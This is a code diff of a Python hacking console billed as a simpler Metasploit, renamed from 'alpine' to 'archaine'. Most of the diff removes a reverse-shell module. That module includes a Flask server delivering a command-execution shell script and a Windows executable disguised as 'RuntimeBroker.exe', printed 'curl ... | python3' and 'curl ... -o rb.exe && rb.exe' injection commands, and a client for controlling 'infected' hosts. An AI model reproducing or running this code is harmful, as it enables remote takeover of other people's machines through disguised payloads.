@@ -71,266 +71,10 @@ class essensials:
         except:
             return False
 
-class EndpointAction(object):
-    """
-    https://stackoverflow.com/questions/40460846/using-flask-inside-class
-
-    line 74
-    """
-
-    def __init__(self, action, send="no"):
-            
-        self.action = action
-        self.response = send
-
-    def __call__(self, send="ok"):
-        self.action()
-
-        if self.response != "alpineCompiled":
-            return self.response
-        else:
-            try:
-                from flask import send_file
-            except ImportError:
-                print("[!] flask needed for this")
-                return
-
-            # MOST JANK SHIT IVE DONE
-            return send_file('./dist/rs-windows.exe', download_name='RuntimeBroker.exe', as_attachment=True) # RuntimeBroker.exe is usually skipped over
-
-
-class FlaskAppWrapper(object):
-    """
-    https://stackoverflow.com/questions/40460846/using-flask-inside-class
-
-    i edited it and only god knows how it works
-    """
-    app = None
-
-    def __init__(self, name):
-        try:
-            from flask import Flask, request
-        except ImportError:
-            print("[!] flask needed for this")
-            return
-            
-        self.app = Flask(name)
-        self.req = request
-        self.flsk = Flask
-
-    def shutdown(self):
-        if sysVar.rsSite:
-            if sysVar.rsAllow:
-                sysVar.rsSite = not sysVar.rsSite
-                if not sysVar.rsSiteNotified: print("[!!!] this will be depreciated eventually and i am working on a fix [!!!]"); sysVar.rsSiteNotified = True
-                func = self.req.environ.get('werkzeug.server.shutdown')
-                #func = sel
-                if func is None:
-                    raise RuntimeError('Not running with the Werkzeug Server')
-                func()
-            else:
-                return
-        else:
-            return
-
-    def winCompiled(self):
-        """
-        return windows compiled exe
-        """
-        return
-
-    def run(self, port, ip):
-        self.app.add_url_rule("/shutdown", "shutdown", EndpointAction(self.shutdown, send="ok"))
-        self.app.add_url_rule("/windows", "windows", EndpointAction(self.winCompiled, send="alpineCompiled")) # END ME
-        #self.app.add_url_rule("/windows", "windows", EndpointAction(self.win, send="ok"))
-
-        try:
-            self.app.run(ip, port=port, debug=False, use_reloader=False)
-        except RuntimeError:
-            pass
-
-    def add_endpoint(self, endpoint=None, endpoint_name=None, handler=None, send="ok"):
-        self.app.add_url_rule(endpoint, endpoint_name, EndpointAction(handler, send=handler()))
-
 class modules:
     """
     built in scripts and stuff
     """
-    class reverse_shell:
-        def flaskThread(a, ip, port:int):
-            process = threading.Thread(target=a.run, args=(port, ip,), daemon=True)
-            process.start()
-
-
-        def script():
-            """
-            python script
-            """
-
-            # temporary
-            script = """
-import socket
-from subprocess import getoutput
-
-skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-skt.bind(("0.0.0.0", int(5354)))
-
-skt.listen(1)
-
-while True:
-    conn, addr = skt.accept()
-
-    with conn:
-        while True:
-            data = conn.recv(65536).decode('utf-8')
-
-            if not data:
-                print("not data")
-                break
-
-            if data == "alpine!die":
-                quit()
-
-            conn.send(getoutput(data).encode('utf-8'))
-            """
-
-            return script
-
-        def stopFlask(args:list):
-            """
-            stop flask server
-            """
-
-            try:
-                from httpx import get, RemoteProtocolError
-            except ImportError:
-                print("[!] httpx needed for this")
-                return
-
-            if sysVar.rsSite == True:
-                sysVar.rsAllow = True
-
-                sleep(0.5)
-
-                try:
-                    get("http://127.0.0.1:{}/shutdown".format(sysVar.rsSitePort), proxies={}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"})
-                except RemoteProtocolError:
-                    pass
-
-                sleep(0.5)
-
-                print("[-] closed site")
-                sysVar.rsAllow = False
-                return
-            else:
-                print("[!] flask server not running")
-
-
-        def initDownload(args:list):
-            """
-            execute the download server for quick execution/injection
-            """
-
-            try:
-                ip = args[1] # check if all variables are here
-                port = args[2]
-
-                sysVar.rsSitePort = port
-            except:
-                print("rs-download (server ip) (port)")
-                return
-
-            try:
-                from httpx import get, RemoteProtocolError # import remoteprotocol error
-                # remoteprotocolerror shows up when the server disconnects mid request
-            except ImportError:
-                print("[!] httpx needed for this")
-                return
-
-            if sysVar.rsSite == True:
-                # site already running
-                if input("[!] flask server already running; close it? [Y/n]").lower() == "y": 
-                    # shutdown site server
-                    sysVar.rsAllow = True # allow shutdown requests
-
-                    sleep(.25) # wait a bit
-
-                    try:
-                        get("http://127.0.0.1:{}/shutdown".format(port), proxies={}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}) # make the shutdown request
-                    except RemoteProtocolError:
-                        pass
-
-                    print("[-] closed site")
-                    sysVar.rsAllow = False # disallow shutdown requests
-                    sysVar.rsSitePort = None # remove site port
-                    return
-                else:
-                    # choice was n or something else
-                    return
-                
-            a = FlaskAppWrapper('wrap') # generate wrapper
-            a.add_endpoint(endpoint='/', endpoint_name='script', handler=modules.reverse_shell.script) # add our script endpoint
-            #a.add_endpoint(endpoint='/shutdown', endpoint_name='shutdown', handler=modules.reverse_shell.shutdown)s
-            
-            threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start() # start flask thread
-
-            print("[+] started flask download server!\n \
- | use \"curl http://{}:{}/ | python3\" to inject using python\n \
- | use \"curl http://{}:{}/windows -o rb.exe && rb.exe\" to inject using compiled exe\n  \
- \\ connect to client with their ip and the port 5354\n".format(ip, port, ip, port)) 
-
-            sleep(.5) # wait a bit
-
-            sysVar.rsSite = True # show that we're running the site
-
-        def initSocket(args:list):
-            """
-            main TCP socket client
-            """
-
-            try:
-                import socket
-            except ImportError:
-                print("[!] socket required for this")
-
-            try:
-                clientIP, clientP = args[1], args[2] # set our needed vars
-            except:
-                print("rs-probe (client ip) (client port)")
-
-            mainSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # generate tcp socket
-            mainSock.settimeout(5) # set timeout to 5 seconds
-
-            try:
-                mainSock.connect((clientIP, int(clientP))) # connect to client
-            except socket.gaierror: # failed to connect
-                print("[!] client ip doesnt exist")
-                return
-            except ConnectionRefusedError: # V
-                print("[!] machine active, but was unable to connect")
-                return
-
-            print("connected; use \"alpine!die\" to full exit client's script; use ctrl+c to leave\n") # didnt fail
-
-            while True: # do this forever
-                try:
-                    command = input("[{}:{}]> ".format(clientIP, clientP))
-
-                    # if the command is to kill the client;
-                    #                           V: send the packet to client            V: leave since client wont respond
-                    if command == "alpine!die": mainSock.send(command.encode('utf-8')); return
-
-                    mainSock.send(command.encode('utf-8'))
-                except KeyboardInterrupt: # if input gives keyboard interrupt (i shouldnt nest all of this here but wtv)
-                    print("\n\nctrl+c")
-                    return
-
-                try:
-                    print(mainSock.recv(65536).decode('utf-8')) # attempt to recieve data
-                except socket.timeout: # if timed out
-                    print("timeout") # try again
-            
     class dns:
         def start(args:list):
             """
@@ -426,21 +170,6 @@ class sysVar:
             "module": modules.clone.cloneSite,
             "help": "download a site's HTML; cloneSite (domain)"
         },
-
-        "rs-download": {
-            "module": modules.reverse_shell.initDownload,
-            "help": "start reverse shell http flask server to download file from; rs-download (server ip) (server port)"
-        },
-
-        "rs-probe": {
-            "module": modules.reverse_shell.initSocket,
-            "help": "attempt to connect to infected IP with our reverse shell; rs-probe (client's ip) (client's port)"
-        },
-
-        "rs-dstop": {
-            "module": modules.reverse_shell.stopFlask,
-            "help": "stop reverse shell http flask server"
-        },
     }
 
     runnable_plugins = [] # variable name
@@ -449,20 +178,21 @@ class sysVar:
     rsSitePort = None # set previously given site port
     rsSiteNotified = False # for the shutdown thing
     activeThreads = [] # variable name
+    TCP_IP = None
+    TCP_PORT = None # set our reverse shell vars
 
 if __name__ == "__main__":
     plugins = plugin.load(folder="modules") # load
 
     print(colors.bold(r"""
-                ___                                  
-               /\_ \            __                   
-           __  \//\ \    _____ /\_\    ___      __   
-         /'__`\  \ \ \  /\ '__`\/\ \ /' _ `\  /'__`\ 
-        /\ \L\.\_ \_\ \_\ \ \L\ \ \ \/\ \/\ \/\  __/ 
-        \ \__/.\_\/\____\\ \ ,__/\ \_\ \_\ \_\ \____\
-         \/__/\/_/\/____/ \ \ \/  \/_/\/_/\/_/\/____/
-                           \ \_\                     
-                            \/_/                     
+                      __                                      
+                     /\ \                __                   
+    __     _ __   ___\ \ \___      __   /\_\    ___      __   
+  /'__`\  /\`'__\/'___\ \  _ `\  /'__`\ \/\ \ /' _ `\  /'__`\ 
+ /\ \L\.\_\ \ \//\ \__/\ \ \ \ \/\ \L\.\_\ \ \/\ \/\ \/\  __/ 
+ \ \__/.\_\\ \_\\ \____\\ \_\ \_\ \__/.\_\\ \_\ \_\ \_\ \____\
+  \/__/\/_/ \/_/ \/____/ \/_/\/_/\/__/\/_/ \/_/\/_/\/_/\/____/
+                                                                                    
 
     a more user friendly (but worse) version of metasploit
                 "All for one and one for all!"
@@ -474,23 +204,23 @@ if __name__ == "__main__":
     stdout = None
 
     for p in plugins[1]: # for plugin in plugins list
-        if len(plugins[1][p][1][0]) == 0: continue # sanity check
-        for executable in plugins[1][p][1][0]: # for every executable in the plugin's executable list
+        if len(plugins[1][p][1]) == 0: continue # sanity check
+        for executable in plugins[1][p][1]: # for every executable in the plugin's executable list
             sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])] = {} # create dict
 
             try:
-                sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])]["help"] = plugins[1][p][1][1][executable].strip() # define help
+                sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])]["help"] = plugins[1][p][1][executable].strip() # define help
             except KeyError: # command's help not in configurationfile
-                raise KeyError("\"{}\"'s command \"{}\" doesn't have a help key pair in it's configuration".format(plugins[1][p][0], executable))
+                raise KeyError("{}'s command {} doesn't have a help key pair in it's configuration".format(plugins[1][p][0], executable))
             sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])]["module"] = None # set module as None to show it's not ours
 
     stdout = save_stdout
 
     while True:
-        c = essensials.sanitized_input("\nalpine#> ", q=False) # q=True to quit if ctrl+c
+        c = essensials.sanitized_input("\narchaine#> ", q=False) # q=True to quit if ctrl+c
 
         if c == False:
-            print("\nuse \"exit\" to leave alpine")
+            print("\nuse \"exit\" to leave archaine")
             continue
 
         elif c == "help":
@@ -517,7 +247,7 @@ if __name__ == "__main__":
 
         except KeyError: # if not in modules:
             for p in plugins[1]: # for plugin in plugins list
-                for executable in plugins[1][p][1][0]: # for every executable in the plugin's executable list
+                for executable in plugins[1][p][1]: # for every executable in the plugin's executable list
                     if c.split(' ')[0] == executable: # if our choice in plugin's executable path
                         plg = plugins[1][p][2] # chosen plugin
                         args = (c.split(' ')[0], c.split(' '), plg) # generate function args
